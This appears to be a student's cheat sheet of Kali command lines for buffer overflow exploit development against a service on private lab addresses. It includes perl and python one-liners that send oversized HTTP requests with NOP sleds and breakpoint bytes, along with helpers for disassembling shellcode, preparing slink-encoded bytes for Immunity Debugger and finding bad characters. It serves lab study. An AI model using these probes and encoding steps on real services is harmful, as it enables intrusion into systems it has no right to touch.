KALI:
sed -i 's/10.11.0.119/192.168.162.141/g' * //replace all occurrences of 10.11.0.119 with 192.168.162.141 in all files in current directory 
perl -e 'print "GET /" . "<unique string>" . "\x41\x42\x42\x42" . " HTTP/1.1\n" . "\x90"x100 . "\xcc"x100' | nc 192.168.162.142 20000
python -c "print 'GET /' + 'A'*131 + 'BBBB' + 'CCCC' + 'DDDD' + 'HTTP/1.1 EEEEEEEEEEE'" | nc 192.168.25.2 20000   
echo -ne 'echo A>%tmp%\xx.txt\x00' | xxd -ps | fold -w8 | tac                     //Convert command to hex, split into groups of 4, and reverse the order of the groups
SHELLCODE to ASM:
>echo -ne "\xeb\x30" > raw
>ndisasm -b32 raw
00000000  EB30              jmp short 0x32
1-LINER
echo -ne '\xeb\x1d' | ndisasm -b32 -

cat slinkOutput.txt | awk '{print $3}' | grep -v "\[" | grep -v "bad" | sed "s/\"//g" | sed "s/\\\x/ /g"   // Use this command to convert slink calculations output into a form that you can binary-paste into Immunity
cat slinkOutput.txt | awk '{print $3}' | grep -v "\[" | grep -v "bad" | sed "s/\"//g" | tr -d "\n\r"       // Use this command to convert slink calculations output into a form that can be used in python script
sed 's/..../&\n/g' allHexChars.txt > one                                                                   // Put each hex value in allHexChars on its own line     
sed 's/..../&\n/g' allowedChars.txt > two                                                                  // Put each hex value in allowedChars on its own line
diff -y one two | awk '$2=="<"{print $1}' | tr -d '\n'                                                     // Get the difference (badChars) between files one and two, and recombine into one line by removing newline character
